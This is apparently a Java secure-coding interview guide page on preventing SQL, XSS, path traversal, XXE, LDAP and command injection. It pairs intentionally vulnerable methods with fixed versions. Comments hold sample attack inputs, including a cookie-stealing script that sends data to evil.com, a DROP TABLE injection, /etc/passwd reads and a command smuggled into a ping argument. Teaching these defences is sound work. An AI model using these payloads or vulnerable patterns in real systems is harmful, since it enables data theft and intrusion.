# Q8: How to Prevent Injection Attacks?

[Home](../../README.md) > [Java Security](./README.md) > Preventing Injection

---

## Overview

Injection attacks occur when **untrusted data is sent to an interpreter as part of a command or query**. They are consistently ranked among the top vulnerabilities in the OWASP Top 10. Java applications must guard against SQL injection, XSS, path traversal, XXE, LDAP injection, and command injection.

## SQL Injection

### The Vulnerability

```java
import java.sql.*;

public class SQLInjectionDemo {

    // ❌ Anti-pattern: String concatenation in SQL queries
    public User findUser(Connection conn, String username) throws SQLException {
        String query = "SELECT * FROM users WHERE username = '" + username + "'";
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(query);
        // Input: ' OR '1'='1
        // Becomes: SELECT * FROM users WHERE username = '' OR '1'='1'
        // Returns ALL users!

        // Input: '; DROP TABLE users; --
        // Becomes: SELECT * FROM users WHERE username = ''; DROP TABLE users; --'
        // Drops the entire table!

        return mapUser(rs);
    }

    // ✅ Best practice: Use PreparedStatement with parameterized queries
    public User findUserSafe(Connection conn, String username) throws SQLException {
        String query = "SELECT * FROM users WHERE username = ?";
        try (PreparedStatement pstmt = conn.prepareStatement(query)) {
            pstmt.setString(1, username);  // Parameter is escaped automatically
            try (ResultSet rs = pstmt.executeQuery()) {
                return mapUser(rs);
            }
        }
        // The ? placeholder ensures input is treated as DATA, never as SQL code
    }

    // ✅ Best practice: Parameterized INSERT
    public void createUser(Connection conn, String username, String email)
            throws SQLException {
        String sql = "INSERT INTO users (username, email, created_at) VALUES (?, ?, ?)";
        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, username);
            pstmt.setString(2, email);
            pstmt.setTimestamp(3, Timestamp.valueOf(java.time.LocalDateTime.now()));
            pstmt.executeUpdate();
        }
    }

    // ✅ Best practice: Dynamic column ordering with whitelist
    public List<User> findAllSorted(Connection conn, String sortColumn)
            throws SQLException {
        // Cannot parameterize column names - use whitelist instead
        Set<String> allowedColumns = Set.of("username", "email", "created_at");
        if (!allowedColumns.contains(sortColumn)) {
            throw new IllegalArgumentException("Invalid sort column: " + sortColumn);
        }

        String sql = "SELECT * FROM users ORDER BY " + sortColumn;
        try (Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(sql)) {
            return mapUsers(rs);
        }
    }
}
```

## XSS Prevention (Cross-Site Scripting)

```java
public class XSSPrevention {

    // ❌ Anti-pattern: Directly embedding user input in HTML
    public String unsafeGreeting(String name) {
        return "<h1>Hello, " + name + "!</h1>";
        // Input: <script>document.location='http://evil.com/steal?c='+document.cookie</script>
        // The browser executes the injected script!
    }

    // ✅ Best practice: HTML-encode all user output
    public String safeGreeting(String name) {
        return "<h1>Hello, " + encodeHtml(name) + "!</h1>";
    }

    // ✅ HTML entity encoding
    public static String encodeHtml(String input) {
        if (input == null) return "";
        StringBuilder sb = new StringBuilder(input.length());
        for (char c : input.toCharArray()) {
            switch (c) {
                case '&'  -> sb.append("&amp;");
                case '<'  -> sb.append("&lt;");
                case '>'  -> sb.append("&gt;");
                case '"'  -> sb.append("&quot;");
                case '\'' -> sb.append("&#x27;");
                case '/'  -> sb.append("&#x2F;");
                default   -> sb.append(c);
            }
        }
        return sb.toString();
    }

    // ✅ Best practice: Use a proven library (OWASP Java Encoder)
    // import org.owasp.encoder.Encode;
    //
    // String safe = Encode.forHtml(userInput);           // HTML body
    // String safeAttr = Encode.forHtmlAttribute(input);  // HTML attributes
    // String safeJs = Encode.forJavaScript(input);       // JavaScript context
    // String safeUrl = Encode.forUriComponent(input);    // URL parameters
}
```

## Path Traversal

```java
import java.nio.file.*;

public class PathTraversalPrevention {

    private static final Path UPLOAD_DIR = Path.of("/app/uploads");

    // ❌ Anti-pattern: Directly using user input as file path
    public byte[] readFileUnsafe(String filename) throws Exception {
        return java.nio.file.Files.readAllBytes(Path.of("/app/uploads/" + filename));
        // Input: ../../etc/passwd
        // Reads: /etc/passwd  (outside the intended directory!)
    }

    // ✅ Best practice: Validate and normalize the path
    public byte[] readFileSafe(String filename) throws Exception {
        // Resolve and normalize
        Path requestedPath = UPLOAD_DIR.resolve(filename).normalize();

        // Verify the resolved path is still within the upload directory
        if (!requestedPath.startsWith(UPLOAD_DIR)) {
            throw new SecurityException("Path traversal attempt: " + filename);
        }

        // Additional validation
        if (filename.contains("\0")) {
            throw new SecurityException("Null byte in filename");
        }

        return Files.readAllBytes(requestedPath);
    }

    // ✅ Best practice: Whitelist allowed file extensions
    public byte[] readFileSafeStrict(String filename) throws Exception {
        Set<String> allowedExtensions = Set.of(".txt", ".pdf", ".png", ".jpg");

        String extension = filename.substring(filename.lastIndexOf('.'));
        if (!allowedExtensions.contains(extension.toLowerCase())) {
            throw new SecurityException("File type not allowed: " + extension);
        }

        Path requestedPath = UPLOAD_DIR.resolve(filename).normalize();
        if (!requestedPath.startsWith(UPLOAD_DIR)) {
            throw new SecurityException("Path traversal attempt");
        }

        return Files.readAllBytes(requestedPath);
    }
}
```

## XML External Entity (XXE) Injection

```java
import javax.xml.parsers.*;
import org.xml.sax.InputSource;
import java.io.StringReader;

public class XXEPrevention {

    // ❌ Anti-pattern: Default XML parser configuration
    public void parseUnsafe(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        // Default config allows external entities!
        // Malicious XML:
        // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
        // <data>&xxe;</data>
        // This reads /etc/passwd from the server!
    }

    // ✅ Best practice: Disable external entities and DTDs
    public org.w3c.dom.Document parseSafe(String xml) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

        // Disable external entities
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
        factory.setXIncludeAware(false);
        factory.setExpandEntityReferences(false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        return builder.parse(new InputSource(new StringReader(xml)));
    }

    // ✅ Best practice: Use SAX parser with disabled features
    public void parseSafeSAX(String xml) throws Exception {
        SAXParserFactory spf = SAXParserFactory.newInstance();
        spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        spf.setFeature("http://xml.org/sax/features/external-general-entities", false);
        spf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);

        SAXParser parser = spf.newSAXParser();
        parser.parse(new InputSource(new StringReader(xml)), new org.xml.sax.helpers.DefaultHandler());
    }
}
```

## LDAP Injection

```java
import javax.naming.directory.*;
import javax.naming.NamingEnumeration;

public class LDAPInjectionPrevention {

    // ❌ Anti-pattern: Concatenating user input into LDAP queries
    public SearchResult findUserUnsafe(DirContext ctx, String username) throws Exception {
        String filter = "(uid=" + username + ")";
        // Input: *)(|(objectClass=*)
        // Becomes: (uid=*)(|(objectClass=*))
        // Returns ALL entries in the directory!
        NamingEnumeration<SearchResult> results =
            ctx.search("ou=users,dc=example,dc=com", filter, new SearchControls());
        return results.hasMore() ? results.next() : null;
    }

    // ✅ Best practice: Escape special LDAP characters
    public SearchResult findUserSafe(DirContext ctx, String username) throws Exception {
        String sanitized = escapeLdapFilter(username);
        String filter = "(uid=" + sanitized + ")";
        NamingEnumeration<SearchResult> results =
            ctx.search("ou=users,dc=example,dc=com", filter, new SearchControls());
        return results.hasMore() ? results.next() : null;
    }

    // ✅ LDAP filter character escaping
    public static String escapeLdapFilter(String input) {
        StringBuilder sb = new StringBuilder();
        for (char c : input.toCharArray()) {
            switch (c) {
                case '\\' -> sb.append("\\5c");
                case '*'  -> sb.append("\\2a");
                case '('  -> sb.append("\\28");
                case ')'  -> sb.append("\\29");
                case '\0' -> sb.append("\\00");
                default   -> sb.append(c);
            }
        }
        return sb.toString();
    }
}
```

## Command Injection

```java
public class CommandInjectionPrevention {

    // ❌ Anti-pattern: Passing user input to Runtime.exec() via shell
    public String unsafePing(String host) throws Exception {
        Process p = Runtime.getRuntime().exec("ping -c 1 " + host);
        // Input: google.com; cat /etc/passwd
        // Executes both commands!
        return new String(p.getInputStream().readAllBytes());
    }

    // ✅ Best practice: Use ProcessBuilder with argument array (no shell)
    public String safePing(String host) throws Exception {
        // Validate input first
        if (!host.matches("^[a-zA-Z0-9.-]+$")) {
            throw new SecurityException("Invalid hostname: " + host);
        }

        ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host);
        pb.redirectErrorStream(true);
        Process p = pb.start();

        String output = new String(p.getInputStream().readAllBytes());
        int exitCode = p.waitFor();

        if (exitCode != 0) {
            throw new RuntimeException("Ping failed with exit code: " + exitCode);
        }
        return output;
    }

    // ✅ Best practice: Avoid exec entirely when a Java API exists
    public boolean isHostReachable(String host) throws Exception {
        if (!host.matches("^[a-zA-Z0-9.-]+$")) {
            throw new SecurityException("Invalid hostname");
        }
        return java.net.InetAddress.getByName(host).isReachable(5000);
    }
}
```

## Input Validation Patterns

```java
import java.util.regex.Pattern;

public class InputValidation {

    // ✅ Whitelist validation patterns
    private static final Pattern EMAIL = Pattern.compile(
        "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$");

    private static final Pattern USERNAME = Pattern.compile(
        "^[a-zA-Z0-9_]{3,30}$");

    private static final Pattern PHONE = Pattern.compile(
        "^\\+?[0-9]{10,15}$");

    public static String validateEmail(String input) {
        if (input == null || !EMAIL.matcher(input).matches()) {
            throw new IllegalArgumentException("Invalid email format");
        }
        return input.trim().toLowerCase();
    }

    public static String validateUsername(String input) {
        if (input == null || !USERNAME.matcher(input).matches()) {
            throw new IllegalArgumentException(
                "Username must be 3-30 alphanumeric characters or underscores");
        }
        return input;
    }

    // ✅ Length-limited input to prevent ReDoS and resource exhaustion
    public static String sanitizeInput(String input, int maxLength) {
        if (input == null) return "";
        if (input.length() > maxLength) {
            throw new IllegalArgumentException(
                "Input exceeds maximum length of " + maxLength);
        }
        return input.strip();
    }
}
```

## OWASP Guidelines Summary

| Principle | Implementation |
|-----------|---------------|
| **Parameterize queries** | `PreparedStatement` for SQL, parameterized API for LDAP |
| **Encode output** | HTML-encode for web, URL-encode for URLs |
| **Validate input** | Whitelist allowed characters, check length |
| **Disable dangerous features** | DTDs/external entities in XML parsers |
| **Avoid shell commands** | Use Java APIs or `ProcessBuilder` with argument arrays |
| **Defense in depth** | Combine validation + encoding + parameterization |

## Interview Tips

| Point | Detail |
|-------|--------|
| **SQL injection** | Always use `PreparedStatement`; never concatenate user input |
| **XSS** | Encode output in the correct context (HTML, JS, URL) |
| **Path traversal** | Normalize paths and verify they stay within allowed directories |
| **XXE** | Disable external entities and DTD processing in XML parsers |
| **Command injection** | Use `ProcessBuilder` with arg arrays; prefer Java APIs |
| **Defense in depth** | Layer input validation + parameterization + output encoding |

---

[<< Previous: Q7 - SSL/TLS](./q07-ssl-tls.md) | [Next: Q9 - Secure Coding Practices >>](./q09-secure-coding-practices.md)
